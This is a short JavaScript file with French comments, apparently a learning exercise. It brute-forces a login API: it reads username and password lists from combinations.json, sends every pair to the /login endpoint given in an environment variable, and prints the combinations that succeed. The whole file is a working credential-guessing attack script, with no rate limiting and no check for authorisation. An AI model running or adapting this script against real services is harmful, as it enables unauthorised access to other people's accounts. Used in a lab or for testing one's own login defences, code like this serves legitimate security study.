/**
 * Je peux l'importe comme ça car j'ai mis "type": "module" dans le package.json
 */

import axios from "axios";
import fs from "fs";
import dotenv from "dotenv";

// Charger les variables d'environnement
dotenv.config();

/**
 * Je vais lire le fichier `combinations.json` qui contient toutes les combinaisons de noms d'utilisateur et de mots de passe
 */
const combinationsData = fs.readFileSync("combinations.json", "utf8");
// ensuite, je vais le convertir en objet JS
const combinations = JSON.parse(combinationsData);

// Je vais séparer les noms d'utilisateur et les mots de passe dans des tableaux différents
const usernames = combinations.usernames;
const passwords = combinations.passwords;

// Fonction pour afficher un message réussi avec de la couleur
function successMessage(message) {
	console.log("\x1b[32m%s\x1b[0m", message);
}

// Fonction pour afficher un message d'erreur avec de la couleur
function errorMessage(message) {
	console.log("\x1b[31m%s\x1b[0m", message);
}

// Effectuer des tests de force brute pour toutes les combinaisons de noms d'utilisateur et de mots de passe
usernames.forEach((username) => {
	passwords.forEach((password) => {
		testLogin(username, password);
	});
});

// Fonction pour effectuer une requête de test de connexion
async function testLogin(username, password) {
	const API = process.env.API_URL;
	try {
		await axios.post(`${API}/login`, {
			username,
			password,
		});

		successMessage(
			`🎊 Connexion réussie 🎊 ! Utilisateur : ${username}, Mot de passe : ${password}`
		);
	} catch (error) {
		errorMessage(
			`Échec de la connexion. Utilisateur : ${username}, Mot de passe : ${password}`
		);
	}
}
